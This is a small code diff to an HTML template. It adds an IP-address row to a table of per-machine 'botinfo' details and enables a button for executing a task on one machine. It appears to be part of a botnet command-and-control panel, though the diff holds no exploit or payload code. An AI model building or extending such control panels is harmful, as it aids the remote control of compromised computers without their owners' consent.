@@ -18,6 +18,10 @@
                          <td>{$botinfo.hwid}</td>
                      </tr>
                      <tr>
+                         <td>IP Address</td>
+                         <td>{$botinfo.ip}</td>
+                     </tr>
+                     <tr>
                          <td>Computer Name</td>
                          <td>{$botinfo.computrername}</td>
                      </tr>
@@ -90,9 +94,9 @@
                          <td>{$botinfo.version}</td>
                      </tr>
                  </table>
-              <!--  <hr>
+                 <hr>
 
-                <a href="#" class="btn btn-primary">Execute Task on This Only</a> -->
+                <a href="/tasks/{$botinfo.id}" class="btn btn-primary">Execute Task on This Only</a>
                 <hr>
                 <br>
             </div>
